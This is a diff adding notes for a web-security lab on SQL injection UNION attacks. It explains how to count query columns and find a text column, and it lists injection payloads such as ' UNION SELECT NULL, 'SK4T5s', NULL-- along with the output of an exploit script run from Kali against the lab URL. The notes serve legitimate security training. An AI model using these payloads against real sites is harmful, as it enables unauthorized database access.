@@ -1,0 +1,99 @@
+LAB 04 - SQL injection UNION attack, finding a column containing text
+Determining the data type of the columns that are returned by the vulnerable query
+
+SQLi - Product category filter
+
+End goal: Make the database retrieve the string: 'SK4T5s'
+
+Background on how the UNION operator works:
+
+table1      table2
+a | b       c | d
+------      -----
+1 , 2       2 , 3
+3 , 4       4 , 5
+
+Query #1: SELECT a,b FROM table11,2
+1,2
+3,4
+
+Query #2: SELECT a,b FROM table 1 UNION SELECT c,d FROM table2
+1,2
+3,4
+2,3
+4,5
+
+Rule with UNION (https://learn.microsoft.com/en-us/sql/t-sql/language-elements/set-operators-union-transact-sql?view=sql-server-ver16)
+- The number and the order of the columns must be the same in all queries
+- The data types must be compatible
+
+#######################################
+# Step 1: Determine number of columns #
+#######################################
+
+METHOD 1: Utilize UNION operator
+
+SELECT ? FROM table1 UNION SELECT NULL
+- error -> incorrect number of columns
+
+SELECT ? FROM table1 UNION SELECT NULL, NULL
+- error -> incorrect number of columns
+
+SELECT ? FROM table1 UNION SELECT NULL, NULL, NULL...
+- error -> incorrect number of columns
+
+SELECT ? FROM table1 UNION SELECT NULL, NULL, NULL, NULL
+- 200 response code -> correct number of columns
+
+Iteratively running these commands above will reveal to us how many rows table1 has.
+
+METHOD 2: Utilize the ORDER BY operator
+
+SELECT a,b FROM table1 ORDER BY <NUM> // order by column <NUM>
+
+SELECT a,b FROM table1 ORDER BY 1
+SELECT a,b FROM table1 ORDER BY 2...
+SELECT a,b FROM table1 ORDER BY N
+
+Once a query outputs "error -> incorrect number of columns", we will know that the number of columns is N - 1
+
+##############################################
+# Step 2: Determine data type of the columns #
+##############################################
+
+SELECT a,b,c FROM table1 UNION SELECT 'a', NULL, NULL // test with type TEXT
+-> error -> column is not type string
+-> no error -> column is of type string
+
+SELECT a,b,c FROM table1 UNION SELECT NULL, 'a', NULL // test with type TEXT
+-> error -> column is not type string
+-> no error -> column is of type string
+
+SELECT a,b,c FROM table1 UNION SELECT NULL, NULL, 'a' // test with type TEXT
+-> error -> column is not type string
+-> no error -> column is of type string
+
+continue iteration...
+
+Analysis:
+-> 3 columns (UNKNOWN (likely ID), name, price) -> 1st column is not shown on the page
+
+' UNION SELECT NULL, 'a', NULL--
+-> 2nd column is of type string
+' UNION SELECT NULL, 'SK4T5s', NULL--
+
+################
+# Script Usage #
+################
+script.py <url>
+
+
+Output:
+┌──(kali㉿kali)-[~/Downloads/SQL-Injection-Labs/lab-04]
+└─$ python3 sqli-lab-04.py "https://0afc00d90355d25e80d99eac00eb0061.web-security-academy.net"
+[+] Figuring out number of columns...
+[+] The number of columns is 3.
+[+] Figuring out which column contains text...
+[+] The column that contains text is 2.
+
+
